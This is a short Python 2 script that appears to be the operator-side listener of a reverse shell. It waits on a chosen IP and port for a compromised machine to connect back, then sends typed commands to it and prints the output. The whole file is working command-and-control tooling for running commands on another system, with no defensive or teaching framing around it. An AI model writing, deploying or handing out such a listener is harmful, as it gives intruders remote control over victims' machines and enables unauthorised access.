#!/usr/bin/env python

import socket, argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--listen", dest="listener", help="Host IP to listen on")
    parser.add_argument("-p", "--port", dest="port", help="Port to listen on")
    options = parser.parse_args()
    if not options.listener:
        # handle error
        parser.error("[-] Please specify a host IP to listen on, use --help for more info")
    if not options.port:
        # handle error
        parser.error("[-] Please specify a port to listen on, use --help for more info")
    return options

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # enable socket re-use, if connection drops - re-establish connection
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Listening on " + ip + ":" + str(port) + "...")
        self.connection, address = listener.accept()
        print("[+] Connected from " + str(address) + ".")

    def execute_remotely(self, command):
        self.connection.send(command)
        return self.connection.recv(1024)

    def run(self):
        while True:
            command = raw_input("-[ ")
            result = self.execute_remotely(command)
            print(result)

options = get_arguments()
my_listener = Listener(options.listener, int(options.port))
my_listener.run()